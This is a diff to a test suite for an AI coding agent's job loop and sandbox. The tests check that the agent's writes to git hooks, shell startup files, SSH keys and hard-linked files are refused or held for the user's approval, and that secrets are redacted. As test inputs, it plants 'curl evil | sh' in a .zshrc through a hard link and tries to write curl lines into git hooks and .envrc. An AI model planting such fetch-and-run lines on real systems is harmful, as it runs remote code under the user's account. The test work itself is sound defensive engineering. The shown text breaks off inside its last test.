@@ -1,7 +1,7 @@
 // The job loop: the request it builds, the policy every tool call passes through, and the ledger it leaves.
 import assert from 'node:assert/strict';
-import { spawn } from 'node:child_process';
-import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs';
+import { execFileSync, spawn } from 'node:child_process';
+import { existsSync, linkSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { test } from 'node:test';
@@ -12,11 +12,12 @@ import { add, UsageError } from '../src/memory.mjs';
 import { describeCall, jobPrinter } from '../src/chat.mjs';
 import { getJob, takeInbox, tell } from '../src/jobs.mjs';
 import Anthropic from '@anthropic-ai/sdk';
+import { writablePlaces } from '../src/sandbox.mjs';
 import { contextFor, converse, grantsItself, jobParams, markTail, RETRY, retryable, retryDelay, runJob, runLines, stopReason, tampersMarker } from '../src/loop.mjs';
 import { closeMcp, DECLINED, readConfig, writeConfig } from '../src/mcp.mjs';
 import { ENTRY, paths, REPO_ROOT } from '../src/paths.mjs';
 import { addProject } from '../src/projects.mjs';
-import { cap, capRedacted, childEnv, jailed, runBash, runEditor } from '../src/tools.mjs';
+import { cap, capRedacted, childEnv, EDITOR_TOOL, jailed, runBash, runEditor, runTool } from '../src/tools.mjs';
 import { styles, toolView } from '../src/tty.mjs';
 import { sourcesOf, WEB_TOOLS } from '../src/web.mjs';
 import { freshHome, withHome } from './fixtures/env-sandbox.mjs';
@@ -60,9 +61,14 @@ test('the request: frozen system with a cache breakpoint, the brief as the one u
   assert.equal(worker.context_management.edits[0].type, 'clear_tool_uses_20250919');
   assert.equal(worker.max_tokens, 64_000, 'the thinking every current model does counts toward the limit, so it holds the thinking and the reply');
 
-  const scout = jobParams({ job: { agent: 'scout', model: 'haiku', effort: 'none' }, text: 'look', system: 'rules' });
+  const scout = jobParams({ job: { agent: 'scout', model: 'haiku', effort: 'low' }, text: 'look', system: 'rules' });
   assert.deepEqual(scout.tools.map((t) => t.name), ['bash', 'note', 'ask', 'search_memory', 'finish', 'web_search', 'web_fetch'], 'a scout cannot edit, has no checks to run, and can look on the web');
-  assert.equal('output_config' in scout, false, 'haiku takes no effort');
+  assert.deepEqual(scout.output_config, { effort: 'low' }, 'haiku takes an effort like any other');
+  // A declined reply is run again on another model, server-side, on every model but haiku, whose refusals have no fallback.
+  assert.equal(worker.fallbacks, 'default');
+  assert.deepEqual(worker.betas, ['context-management-2025-06-27', 'server-side-fallback-2026-07-01']);
+  assert.equal('fallbacks' in scout, false);
+  assert.deepEqual(scout.betas, ['context-management-2025-06-27']);
   const reviewer = jobParams({ job: { agent: 'reviewer', model: 'opus', effort: 'high' }, text: 'judge', system: 'rules' });
   assert.deepEqual(reviewer.tools.map((t) => t.name), ['bash', 'note', 'ask', 'search_memory', 'finish'], 'a reviewer cannot edit');
 });
@@ -159,7 +165,8 @@ test('a run: tool calls go through the guard, the jail and the cap; every respon
       assert.match(results(2)[0].content, /Refused: .*delete a whole tree/);
       assert.equal(results(2)[0].is_error, true);
       assert.match(results(2)[1].content, /Refused: .*secret file/);
-      assert.match(results(3)[0].content, /outside the project/);
+      assert.match(results(3)[0].content, /localhost/, 'a file outside the project is read, as the shell reads it');
+      assert.equal(results(3)[0].is_error, false);
       assert.match(results(3)[1].content, /^edited /);
 
       // Each turn re-sends the whole history with a breakpoint on its tail and the one the turn before left; the system prompt keeps its own.
@@ -285,7 +292,7 @@ test('an edit whose old_str is off by trailing spaces, line endings or indentati
   writeFileSync(join(root, 'd.txt'), 'x = 1 \ny = 2\nx = 1\n');
   const twice = runEditor({ command: 'str_replace', path: 'd.txt', old_str: 'x = 1', new_str: 'x = 3' }, ctx);
   assert.equal(twice.isError, true);
-  assert.match(twice.content, /appears 2 times/);
+  assert.match(twice.content, /appears 2 times in .*d\.txt \(lines 1, 3\) — include more context so it is unique$/, 'the lines it starts on are named');
   assert.equal(readFileSync(join(root, 'd.txt'), 'utf8'), 'x = 1 \ny = 2\nx = 1\n', 'nothing was written');
   // An exact match is taken as before, and said plainly.
   assert.equal(runEditor({ command: 'str_replace', path: 'd.txt', old_str: 'y = 2', new_str: 'y = 3' }, ctx).content, `edited ${join(root, 'd.txt')}`);
@@ -554,8 +561,8 @@ test('the API pausing a turn of its own accord is not the end of it; the ledger 
       const root = mkdtempSync(join(tmpdir(), 'sumo-agents-pause-'));
       const ctx = { cwd: root, roots: [root], env: childEnv({ PATH: process.env.PATH }) };
       const params = jobParams({ job: { agent: 'scout', model: 'opus', effort: 'high' }, text: 'look', system: 'rules' });
-      assert.deepEqual(params.thinking, { type: 'adaptive', display: 'summarized' }, 'every model but haiku is asked to say what it thinks');
-      assert.equal('thinking' in jobParams({ job: { agent: 'scout', model: 'haiku', effort: 'none' }, text: 'look', system: 'rules' }), false);
+      assert.deepEqual(params.thinking, { type: 'adaptive', display: 'summarized' }, 'every model is asked to say what it thinks');
+      assert.deepEqual(jobParams({ job: { agent: 'scout', model: 'haiku', effort: 'low' }, text: 'look', system: 'rules' }).thinking, { type: 'adaptive', display: 'summarized' }, 'haiku too');
 
       const { send, seen } = canned([
         { ...reply('pause_turn', [{ type: 'text', text: 'half way' }]), model: 'claude-opus-4-8' },
@@ -579,6 +586,35 @@ test('the API pausing a turn of its own accord is not the end of it; the ledger 
       assert.match(answers[3], /4 times in a row/);
       assert.equal(answers[4], 'same', 'the fifth is answered and the run stops');
       assert.equal(stopReason('loop'), 'stopped: the same call, or the same round of calls, was made 5 times in a row');
+    } finally {
+      db.close();
+    }
+  });
+});
+
+test('a reply that fell back to another model goes back as it came and is priced on the model that answered; a refusal says its category', async () => {
+  await withHome(freshHome(), {}, async () => {
+    const db = openDb();
+    try {
+      const root = mkdtempSync(join(tmpdir(), 'sumo-agents-fallback-'));
+      const ctx = { cwd: root, roots: [root], env: childEnv({ PATH: process.env.PATH }) };
+      const fell = { type: 'fallback', from: { model: 'claude-opus-5-5', stop_reason: 'refusal' }, to: { model: 'claude-opus-4-8' } };
+      const content = [fell, { type: 'text', text: 'done the other way' }];
+      const params = jobParams({ job: { agent: 'scout', model: 'opus', effort: 'high' }, text: 'look', system: 'rules' });
+      const outcome = await converse(db, params, { send: async () => ({ ...reply('end_turn', content, { input_tokens: 1_000_000, output_tokens: 0 }), model: 'claude-opus-4-8' }), ctx, ledger: { kind: 'scout' }, now: () => NOW });
+      assert.equal(outcome.stop, 'end_turn');
+      assert.equal(outcome.text, 'done the other way');
+      assert.deepEqual(params.messages.at(-1), { role: 'assistant', content }, 'the fallback block stays where it came: the API reads from it which model the conversation is on');
+      assert.ok(Math.abs(outcome.totals.costUsd - 5) < 1e-9, 'a million tokens in at opus 4.8\'s price, not opus 5.5\'s');
+      const row = db.prepare('SELECT model, note FROM model_runs ORDER BY id DESC LIMIT 1').get();
+      assert.equal(row.model, 'claude-opus-4-8');
+      assert.match(row.note, /turn 1 end_turn fell back from claude-opus-5-5$/);
+
+      const refused = await converse(db, jobParams({ job: { agent: 'scout', model: 'opus', effort: 'high' }, text: 'look', system: 'rules' }), { send: async () => ({ ...reply('refusal', []), stop_details: { type: 'refusal', category: 'cyber', explanation: null } }), ctx, ledger: { kind: 'scout' }, now: () => NOW });
+      assert.equal(refused.stop, 'refusal');
+      assert.equal(refused.stopDetail, 'cyber');
+      assert.equal(stopReason(refused.stop, refused.stopDetail), 'stopped: the model declined to continue (cyber)');
+      assert.equal(stopReason('refusal'), 'stopped: the model declined to continue');
     } finally {
       db.close();
     }
@@ -649,6 +685,54 @@ test('a job that outgrows the context is summarized server-side at the end of a 
       assert.equal(went.stop, 'end_turn');
       assert.equal(failing.seen[2].messages.length, 3, 'the conversation as it was');
       assert.match(db.prepare('SELECT note FROM model_runs WHERE ok = 0 ORDER BY id DESC LIMIT 1').get().note, /^turn 1 compaction: 529 overloaded/);
+    } finally {
+      db.close();
+    }
+  });
+});
+
+test('a conversation the model will no longer take whole is summarized once and sent again from the summary; refused again, the run ends on the error', async () => {
+  await withHome(freshHome(), {}, async () => {
+    const db = openDb();
+    try {
+      const tooLong = () => new Anthropic.BadRequestError(400, { type: 'error', error: { type: 'invalid_request_error', message: 'prompt is too long: 1050000 tokens > 1000000 maximum' } }, 'Bad Request', undefined);
+      const summary = () => ({ stop_reason: 'compaction', content: [{ type: 'compaction', content: 'what happened so far', encrypted_content: 'opaque', signature: 'sig' }], usage: { input_tokens: 900_000, output_tokens: 600 } });
+      const scripted = (steps) => {
+        const seen = [];
+        const send = async (params) => {
+          seen.push(structuredClone(params));
+          const next = steps.shift();
+          if (typeof next === 'function') throw next();
+          return next;
+        };
+        return { send, seen };
+      };
+
+      const { id } = seed(db, { agent: 'scout', model: 'opus', effort: 'high' });
+      const { send, seen } = scripted([tooLong, summary(), reply('end_turn', [{ type: 'text', text: 'closed' }]), reply('end_turn', [])]);
+      const compacted = [];
+      const outcome = await runJob(db, id, { send, now: () => NOW, onCompact: (c) => compacted.push(c) });
+      assert.equal(outcome.stop, 'end_turn');
+      assert.equal(outcome.error, null);
+      assert.match(seen[1].compaction.instructions, /^Write a hand-off for a model/, 'the refusal is answered with the compaction request');
+      assert.deepEqual(seen[2].messages.map((m) => m.role), ['assistant', 'user'], 'and the request goes again from the summary');
+      assert.deepEqual(seen[2].messages[0].content.map(({ cache_control: _c, ...b }) => b), summary().content);
+      assert.deepEqual(compacted.map((c) => c.summary), ['what happened so far']);
+      const notes = db.prepare('SELECT ok, note FROM model_runs WHERE job_id = ? ORDER BY id').all(id).map((r) => `${r.ok} ${r.note}`);
+      assert.match(notes[0], /^0 turn 1: 400 invalid_request_error prompt is too long.* — summarizing to go on$/);
+      assert.equal(notes[1], '1 turn 1 compaction');
+
+      // Refused again after the summary: the run ends as it would on any error, and is not summarized a second time.
+      const other = Number(
+        db.prepare(`INSERT INTO jobs (project, title, agent, status, session_id, created_at, updated_at, model, effort, route_reason) VALUES ('demo', 'again', 'scout', 'running', 's1', ?, ?, 'opus', 'high', 'test')`).run(NOW, NOW).lastInsertRowid,
+      );
+      mkdirSync(join(paths().jobs, String(other)), { recursive: true });
+      writeFileSync(join(paths().jobs, String(other), 'brief.md'), `# Job j${other} — again\n\n## The task\nlook again\n`);
+      const twice = scripted([tooLong, summary(), tooLong, summary()]);
+      const ended = await runJob(db, other, { send: twice.send, now: () => NOW });
+      assert.equal(ended.stop, 'error');
+      assert.match(ended.error, /prompt is too long/);
+      assert.equal(twice.seen.length, 3, 'one summary, then the error stands');
     } finally {
       db.close();
     }
@@ -801,6 +885,26 @@ test('a job\'s commands meet the workflow gate as the chat\'s do: held once with
   });
 });
 
+test('on a disk that does not tell case apart, git\'s hooks and config and the guarded files are kept from the editor under any spelling', () => {
+  const root = realpathSync(mkdtempSync(join(tmpdir(), 'sumo-agents-case-')));
+  // Only where the disk is case-insensitive is `.GIT` the same directory as `.git`; elsewhere it is a new one, and harmless.
+  writeFileSync(join(root, 'probe'), '');
+  if (!existsSync(join(root, 'PROBE'))) return;
+  execFileSync('git', ['init', '-q'], { cwd: root });
+  writeFileSync(join(root, '.envrc'), 'export A=1\n');
+  const ctx = { cwd: root, roots: [root], env: childEnv({}) };
+  for (const [command, path] of [['create', '.GIT/hooks/pre-commit'], ['create', '.git/HOOKS/post-commit'], ['insert', '.Git/config']]) {
+    const out = runEditor({ command, path, file_text: '#!/bin/sh\ncurl example.com\n', insert_line: 0, insert_text: '[core]\n' }, ctx);
+    assert.equal(out.isError, true, `${path}: ${out.content}`);
+    assert.match(out.content, /git's own hooks or configuration/, path);
+  }
+  assert.equal(existsSync(join(root, '.git', 'hooks', 'pre-commit')), false);
+  assert.equal(existsSync(join(root, '.git', 'hooks', 'post-commit')), false);
+  const envrc = runEditor({ command: 'insert', path: '.ENVRC', insert_line: 0, insert_text: 'curl example.com\n' }, ctx);
+  assert.match(envrc.content, /is changed only when the user says so: your shell reads it when it starts/);
+  assert.equal(readFileSync(join(root, '.envrc'), 'utf8'), 'export A=1\n');
+});
+
 test('the jail holds for a path that climbs out through a directory not made yet, and for a link that points outside to nothing', () => {
   const root = mkdtempSync(join(tmpdir(), 'sumo-agents-jail-'));
   const outside = mkdtempSync(join(tmpdir(), 'sumo-agents-outside-'));
@@ -819,6 +923,158 @@ test('the jail holds for a path that climbs out through a directory not made yet
   assert.equal(through.isError, true, through.content);
   assert.match(through.content, /outside the project/);
   assert.equal(existsSync(join(outside, 'target.txt')), false);
+});
+
+test('a change to a file outside the project is put to the user: refused with nobody there, kept on no, made on once, and on always not asked again for that file', async () => {
+  const root = mkdtempSync(join(tmpdir(), 'sumo-agents-jail-'));
+  // By real path: the question names where a write lands, and the temporary folder is a link on macOS.
+  const outside = realpathSync(mkdtempSync(join(tmpdir(), 'sumo-agents-outside-')));
+  const file = join(outside, 'config.toml');
+  writeFileSync(file, 'a = 1\n');
+  const opened = new Set();
+  const ctx = { cwd: root, roots: [root], env: childEnv({}), opened };
+  const change = (approve, old_str = 'a = 1', new_str = 'a = 2') => runTool({ name: EDITOR_TOOL.name, input: { command: 'str_replace', path: file, old_str, new_str } }, { ...ctx, approve });
+
+  // Nobody there: refused, and the model is told to report it.
+  const alone = await change(null);
+  assert.equal(alone.isError, true);
+  assert.match(alone.content, /is outside the project[\s\S]*\(nobody is here to allow it: report it, with the path and the change, so the user can make it themselves\)$/);
+  assert.equal(readFileSync(file, 'utf8'), 'a = 1\n');
+
+  // Asked as the change itself; a no keeps the file as it is.
+  const asked = [];
+  const declined = await change(async (ask) => (asked.push(ask), 'no'));
+  assert.equal(declined.isError, true);
+  assert.match(declined.content, /\(the user declined changing it: do not try again; carry on another way, or ask the user\)$/);
+  assert.equal(readFileSync(file, 'utf8'), 'a = 1\n');
+  assert.deepEqual(asked.map(({ name, server, tool, path, outside, guarded, directory, input }) => ({ name, server, tool, path, outside, guarded, directory, input })), [{ name: EDITOR_TOOL.name, server: 'editor', tool: 'outside the project', path: file, outside: true, guarded: null, directory: outside, input: { command: 'str_replace', path: file, old_str: 'a = 1', new_str: 'a = 2' } }]);
+  // A no with the user's words carries them to the model, one line, without a secret in them.
+  const reasoned = await change(async () => ({ no: 'use the copy in the project instead,\nnot my home  (key sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)' }));
+  assert.match(reasoned.content, /\(the user declined changing it: [^)]*\)\n\(the user declined it and said: "use the copy in the project instead, not my home \(key \[redacted\]\)" — do what they said instead\)$/);
+  assert.equal(declined.shown, 'declined: not changed');
+  assert.equal(reasoned.shown, 'declined: not changed · you said: "use the copy in the project instead, not my home (key [redacted])"');
+  assert.equal(readFileSync(file, 'utf8'), 'a = 1\n');
+
+  // Once: this change, and the next to the same file is asked again.
+  const made = await change(async () => 'once');
+  assert.equal(made.isError, false, made.content);
+  assert.match(made.content, /^\(.*config\.toml is outside the project; the user allowed this change\)\nedited /);
+  assert.equal(readFileSync(file, 'utf8'), 'a = 2\n');
+  assert.equal(opened.size, 0);
+  let times = 0;
+  await change(async () => (times++, 'always'), 'a = 2', 'a = 3');
+  assert.equal(readFileSync(file, 'utf8'), 'a = 3\n');
+  assert.deepEqual([...opened], [file], 'always opens this file for the session');
+  const again = await change(async () => assert.fail('asked again for a file the user opened'), 'a = 3', 'a = 4');
+  assert.equal(again.isError, false, again.content);
+  assert.match(again.content, /^edited /);
+  assert.equal(readFileSync(file, 'utf8'), 'a = 4\n');
+  assert.equal(times, 1);
+  // Another file beside it is its own question; one in a job's own folder is never asked, it holds what judges the job.
+  const beside = await runTool({ name: EDITOR_TOOL.name, input: { command: 'create', path: join(outside, 'other.toml'), file_text: 'b = 1\n' } }, { ...ctx, approve: async () => 'no' });
+  assert.match(beside.content, /the user declined/);
+  // Its directory, opened for the session: everything under it is written unasked, and the shell may write there too.
+  await runTool({ name: EDITOR_TOOL.name, input: { command: 'create', path: join(outside, 'other.toml'), file_text: 'b = 1\n' } }, { ...ctx, approve: async () => 'directory' });
+  assert.equal(readFileSync(join(outside, 'other.toml'), 'utf8'), 'b = 1\n');
+  assert.deepEqual([...opened], [file, outside]);
+  const under = await runTool({ name: EDITOR_TOOL.name, input: { command: 'create', path: join(outside, 'deeper', 'c.toml'), file_text: 'c = 1\n' } }, { ...ctx, approve: async () => assert.fail('asked under an opened directory') });
+  assert.match(under.content, /^created /);
+  assert.ok(writablePlaces([root], { opened }).includes(outside), 'the shell may write in an opened directory');
+  // A link in an opened directory is judged by where it lands: one pointing out of it is asked, and the question names its target.
+  const elsewhere = realpathSync(mkdtempSync(join(tmpdir(), 'sumo-agents-elsewhere-')));
+  writeFileSync(join(elsewhere, 'victim.txt'), 'safe\n');
+  symlinkSync(join(elsewhere, 'victim.txt'), join(outside, 'link.txt'));
+  const through = [];
+  const linked = await runTool({ name: EDITOR_TOOL.name, input: { command: 'str_replace', path: join(outside, 'link.txt'), old_str: 'safe', new_str: 'owned' } }, { ...ctx, approve: async (ask) => (through.push(ask), 'no') });
+  assert.match(linked.content, /link\.txt \(a link to .*victim\.txt\) is outside the project/);
+  assert.equal(through[0].path, join(elsewhere, 'victim.txt'));
+  assert.equal(readFileSync(join(elsewhere, 'victim.txt'), 'utf8'), 'safe\n');
+  const judged = await runTool({ name: EDITOR_TOOL.name, input: { command: 'create', path: join(outside, 'verdict.md'), file_text: 'x' } }, { ...ctx, roots: [root, outside], approve: async () => assert.fail('asked for a root') });
+  assert.match(judged.content, /can be read, not changed/);
+  // Read anywhere, as the shell is; a secret stays unread.
+  assert.match((await runTool({ name: EDITOR_TOOL.name, input: { command: 'view', path: file } }, ctx)).content, /a = 4/);
+  writeFileSync(join(outside, '.env'), 'KEY=1\n');
+  assert.match((await runTool({ name: EDITOR_TOOL.name, input: { command: 'view', path: join(outside, '.env') } }, ctx)).content, /Refused: .*secret file/);
+});
+
+test('a guarded file — one the shell, a tool or an editor reads later — is changed only when the user says so, this once, in the project or anywhere, and nobody there is a refusal that says why', async () => {
+  await withHome(freshHome(), {}, async () => {
+    const root = mkdtempSync(join(tmpdir(), 'sumo-agents-guarded-'));
+    const home = process.env.HOME;
+    writeFileSync(join(root, '.envrc'), 'export A=1\n');
+    mkdirSync(join(root, '.vscode'));
+    writeFileSync(join(root, '.vscode', 'settings.json'), '{}\n');
+    writeFileSync(join(home, '.zshrc'), '# shell\n');
+    const opened = new Set([home]);
+    const ctx = { cwd: root, roots: [root], env: childEnv({}), opened };
+    const change = (path, approve, extra = {}) => runTool({ name: EDITOR_TOOL.name, input: { command: 'insert', path, insert_line: 0, insert_text: '# added\n', ...extra } }, { ...ctx, approve });
+
+    const alone = await change(join(root, '.envrc'), null);
+    assert.equal(alone.isError, true);
+    assert.match(alone.content, /\.envrc is changed only when the user says so: your shell reads it when it starts\n\(nobody is here to allow it/);
+    assert.equal(readFileSync(join(root, '.envrc'), 'utf8'), 'export A=1\n');
+
+    const asked = [];
+    const declined = await change(join(root, '.vscode', 'settings.json'), async (ask) => (asked.push(ask), 'no'));
+    assert.match(declined.content, /settings\.json is changed only when the user says so: your editor reads it[\s\S]*the user declined/);
+    assert.deepEqual(asked.map(({ tool, path, outside, guarded }) => ({ tool, path, outside, guarded })), [{ tool: 'a guarded file', path: join(root, '.vscode', 'settings.json'), outside: false, guarded: 'your editor reads it' }]);
+
+    // Once: this change; always is not an answer for a guarded file, and an opened directory does not cover one.
+    const made = await change(join(home, '.zshrc'), async (ask) => (asked.push(ask), 'once'));
+    assert.equal(made.isError, false, made.content);
+    assert.match(made.content, /^\(.*\.zshrc is a guarded file; the user allowed this change\)\ninserted /);
+    assert.equal(readFileSync(join(home, '.zshrc'), 'utf8'), '# added\n# shell\n');
+    assert.deepEqual(asked.at(-1).guarded, 'your shell reads it when it starts');
+    assert.equal(asked.at(-1).outside, true);
+    assert.equal(asked.at(-1).directory, null, 'a guarded file never opens a directory');
+    // A plain file right in the home may be opened alone, never with the home: the shell would write all of it.
+    opened.clear();
+    writeFileSync(join(home, 'notes.txt'), 'n\n');
+    const inHome = [];
+    await change(join(home, 'notes.txt'), async (ask) => (inHome.push(ask), 'no'));
+    assert.equal(inHome[0].guarded, null);
+    assert.equal(inHome[0].directory, null);
+    // Keys in ~/.ssh, and another repository's hooks, are guarded: asked each time, and never opened for the session.
+    mkdirSync(join(home, '.ssh'), { recursive: true });
+    writeFileSync(join(home, '.ssh', 'authorized_keys'), '');
+    mkdirSync(join(home, 'other', '.git', 'hooks'), { recursive: true });
+    for (const path of [join(home, '.ssh', 'authorized_keys'), join(home, 'other', '.git', 'hooks', 'pre-commit')]) {
+      const seen = [];
+      const out = await runTool({ name: EDITOR_TOOL.name, input: { command: 'create', path: `${path}.new`, file_text: 'x' } }, { ...ctx, approve: async (ask) => (seen.push(ask), 'always') });
+      assert.match(out.content, /is changed only when the user says so[\s\S]*the user declined/, path);
+      assert.equal(seen[0].directory, null, `${path}: no directory is offered`);
+      assert.equal(opened.size, 0, `${path}: always opens nothing`);
+    }
+    // A project kept inside a guarded directory is its own: its files are not guarded for where it sits.
+    const nested = join(home, '.claude', 'plugins', 'mine');
+    mkdirSync(nested, { recursive: true });
+    writeFileSync(join(nested, 'index.js'), 'x\n');
+    const own = await runTool({ name: EDITOR_TOOL.name, input: { command: 'insert', path: join(nested, 'index.js'), insert_line: 0, insert_text: '// a\n' } }, { ...ctx, cwd: nested, roots: [nested], approve: async () => assert.fail('asked for a file of the project') });
+    assert.match(own.content, /^inserted /);
+    const refused = await change(join(home, '.zshrc'), async () => 'always');
+    assert.match(refused.content, /the user declined/);
+    assert.equal(readFileSync(join(home, '.zshrc'), 'utf8'), '# added\n# shell\n');
+    // Sumo's own MCP file, which says what may run unasked, is one too; a plain file in the project is not.
+    assert.match((await change(join(paths().home, 'mcp.json'), null)).content, /it is the MCP allow list/);
+    writeFileSync(join(root, 'plain.txt'), 'x\n');
+    assert.match((await change(join(root, 'plain.txt'), async () => assert.fail('asked for a plain file'))).content, /^inserted /);
+  });
+});
+
+test('after a command, the files the model had viewed that it changed are named, so it views those again and not the rest', async () => {
+  const root = mkdtempSync(join(tmpdir(), 'sumo-agents-changedby-'));
+  writeFileSync(join(root, 'a.txt'), 'a\n');
+  writeFileSync(join(root, 'b.txt'), 'b\n');
+  writeFileSync(join(root, 'c.txt'), 'c\n');
+  const ctx = { cwd: root, roots: [root], env: childEnv({}), seen: new Map() };
+  for (const name of ['a.txt', 'b.txt', 'c.txt']) runEditor({ command: 'view', path: name }, ctx);
+  await new Promise((r) => setTimeout(r, 20));
+  const ran = await runBash({ command: 'echo more >> a.txt && rm c.txt && echo done' }, { ...ctx, sandbox: false });
+  assert.equal(ran.isError, false, ran.content);
+  assert.equal(ran.content, `done\n(this command changed files you had viewed: ${join(root, 'a.txt')}, ${join(root, 'c.txt')} (gone) — view one again before editing it)`);
+  // What it saw stays as it was: the edit is still said to be against what it remembers.
+  assert.match(runEditor({ command: 'str_replace', path: 'a.txt', old_str: 'a', new_str: 'A' }, ctx).content, /changed on disk since you last viewed it/);
+  assert.deepEqual(await runBash({ command: 'echo quiet' }, { ...ctx, sandbox: false }), { content: 'quiet', isError: false });
 });
 
 test('a secret is redacted before the output is cut, so a key the cut splits does not reach the model in halves', async () => {
@@ -900,6 +1156,27 @@ test('a command past its time limit takes everything it started with it, also wh
   const sleeper = Number(readFileSync(join(root, 'host.pid'), 'utf8'));
   child.kill('SIGTERM');
   await new Promise((r) => child.on('close', r));
+  assert.equal(await settled(() => !alive(sleeper)), true, 'the command went with the process that ran it');
+});
+
+test('Ctrl-C is left to a process that listens for it itself, as a job run does: it carries on, and what it started still goes when it ends', async () => {
+  const root = mkdtempSync(join(tmpdir(), 'sumo-agents-group-'));
+  const host = `
+    const { writeFileSync } = await import('node:fs');
+    const { runCommand } = await import(${JSON.stringify(new URL('../src/tools.mjs', import.meta.url).href)});
+    process.once('SIGINT', () => {
+      writeFileSync('handled', 'yes');
+      setTimeout(() => process.exit(0), 300);
+    });
+    runCommand('sleep 30 & echo $! > host.pid; wait', { cwd: ${JSON.stringify(root)}, env: process.env, signal: new AbortController().signal });
+    setTimeout(() => {}, 30_000);`;
+  const child = spawn(process.execPath, ['--input-type=module', '-e', host], { cwd: root, stdio: 'ignore' });
+  const ended = new Promise((resolve) => child.on('close', (code, signal) => resolve({ code, signal })));
+  assert.equal(await settled(() => existsSync(join(root, 'host.pid')) && readFileSync(join(root, 'host.pid'), 'utf8').trim() !== ''), true);
+  const sleeper = Number(readFileSync(join(root, 'host.pid'), 'utf8'));
+  child.kill('SIGINT');
+  assert.deepEqual(await ended, { code: 0, signal: null }, 'its own handler decided how it ended');
+  assert.equal(readFileSync(join(root, 'handled'), 'utf8'), 'yes');
   assert.equal(await settled(() => !alive(sleeper)), true, 'the command went with the process that ran it');
 });
 
@@ -1214,7 +1491,7 @@ test('a job may ask a stronger model from inside a request — the next one up t
       assert.deepEqual(seen.said, ['call advisor: opus', 'answer a1: advice given'], 'who was asked; the advice itself is encrypted and is not shown');
       assert.deepEqual(params.messages[1].content, content, 'the call and the advice go back as they came: the API reads the advice from them');
       assert.equal(outcome.totals.toolCalls, 1);
-      assert.ok(Math.abs(outcome.totals.costUsd - (0.005815 + 0.023441)) < 1e-9, `the job's own tokens at its price and the advisor's at the advisor's, not ${outcome.totals.costUsd}`);
+      assert.ok(Math.abs(outcome.totals.costUsd - (0.005688 + 0.023441)) < 1e-9, `the job's own tokens at its price and the advisor's at the advisor's, not ${outcome.totals.costUsd}`);
       assert.equal(outcome.totals.inputTokens, 3074 + 2967);
       assert.equal(outcome.totals.outputTokens, 111 + 438);
       assert.equal(outcome.totals.contextTokens, 2 + 1270 + 416 + 85, 'what the conversation holds is what the last pass read and wrote, not both passes added up');
@@ -1305,4 +1582,64 @@ test("every command the model runs carries the marker that says so, a job's its 
       db.close();
     }
   });
+});
+
+test('a job that searches or fetches the web is written down as having read outside the machine, each tool once; one that does not is not', async () => {
+  const { outsideReads } = await import('../src/jobs.mjs');
+  await withHome(freshHome(), {}, async () => {
+    const db = openDb();
+    try {
+      const { id } = seed(db);
+      const web = (sid, name, input) => ({ type: 'server_tool_use', id: sid, name, input });
+      const { send } = canned([
+        reply('tool_use', [web('s1', 'web_search', { query: 'api limits' }), { type: 'web_search_tool_result', tool_use_id: 's1', content: [] }, call('t1', 'bash', { command: 'echo looked' })]),
+        reply('tool_use', [web('s2', 'web_search', { query: 'again' }), { type: 'web_search_tool_result', tool_use_id: 's2', content: [] }, call('t2', 'bash', { command: 'echo again' })]),
+        reply('end_turn', [{ type: 'text', text: 'done' }]),
+        reply('end_turn', [{ type: 'text', text: 'done' }]),
+      ]);
+      await runJob(db, id, { send, now: () => NOW });
+      assert.deepEqual(outsideReads(id), ['web_search']);
+
+      // A second job on the same project, made as seed makes one.
+      const other = { id: Number(db.prepare(`INSERT INTO jobs (project, title, agent, status, session_id, created_at, updated_at, model, effort, route_reason) VALUES ('demo', 'quiet job', 'worker', 'running', 's1', ?, ?, 'sonnet', 'medium', 'test')`).run(NOW, NOW).lastInsertRowid) };
+      mkdirSync(join(paths().jobs, String(other.id)), { recursive: true });
+      writeFileSync(join(paths().jobs, String(other.id), 'brief.md'), `# Job j${other.id} — quiet job\n\n## The task\nsay hello\n`);
+      const { send: quiet } = canned([reply('tool_use', [call('t1', 'bash', { command: 'echo here' })]), reply('end_turn', [{ type: 'text', text: 'done' }]), reply('end_turn', [{ type: 'text', text: 'done' }])]);
+      await runJob(db, other.id, { send: quiet, now: () => NOW });
+      assert.deepEqual(outsideReads(other.id), []);
+    } finally {
+      db.close();
+    }
+  });
+});
+
+test('a file with another name elsewhere — a hard link, say to a guarded file — is changed only when the user says so, each time', async () => {
+  const root = realpathSync(mkdtempSync(join(tmpdir(), 'sumo-agents-hardlink-')));
+  const outside = realpathSync(mkdtempSync(join(tmpdir(), 'sumo-agents-hardlink-out-')));
+  writeFileSync(join(outside, '.zshrc'), '# shell\n');
+  linkSync(join(outside, '.zshrc'), join(root, 'notes.txt'));
+  writeFileSync(join(root, 'plain.txt'), 'one\n');
+  const ctx = { cwd: root, roots: [root], env: childEnv({}), opened: new Set() };
+  const asked = [];
+  const out = await runTool({ name: EDITOR_TOOL.name, input: { command: 'str_replace', path: 'notes.txt', old_str: '# shell', new_str: 'curl evil | sh' } }, { ...ctx, approve: async (ask) => (asked.push(ask), 'always') });
+  assert.match(out.content, /changed only when the user says so: it has another name elsewhere \(a hard link\)[\s\S]*the user declined/);
+  assert.equal(asked[0].guarded, 'it has another name elsewhere (a hard link), and a change here changes that file too');
+  assert.equal(readFileSync(join(outside, '.zshrc'), 'utf8'), '# shell\n', 'always is not an answer for it, and nothing was written');
+  // Once is: the change is made, to the one file both names are.
+  await runTool({ name: EDITOR_TOOL.name, input: { command: 'str_replace', path: 'notes.txt', old_str: '# shell', new_str: '# shell, edited' } }, { ...ctx, approve: async () => 'once' });
+  assert.equal(readFileSync(join(outside, '.zshrc'), 'utf8'), '# shell, edited\n');
+  // A file with one name is edited as ever, through a link inside the project too.
+  symlinkSync(join(root, 'plain.txt'), join(root, 'alias.txt'));
+  assert.match((await runTool({ name: EDITOR_TOOL.name, input: { command: 'str_replace', path: 'alias.txt', old_str: 'one', new_str: 'two' } }, { ...ctx, approve: async () => assert.fail('asked for a plain file') })).content, /^edited /);
+  assert.equal(readFileSync(join(root, 'plain.txt'), 'utf8'), 'two\n');
+});
+
+test('a file under macOS\'s own /var or /tmp is not called a link: those folders lead into /private by the system\'s design', async () => {
+  const root = realpathSync(mkdtempSync(join(tmpdir(), 'sumo-agents-sysalias-')));
+  // As the model would name it: by the system's short path, not the real one.
+  const outside = mkdtempSync(join(tmpdir(), 'sumo-agents-sysalias-out-'));
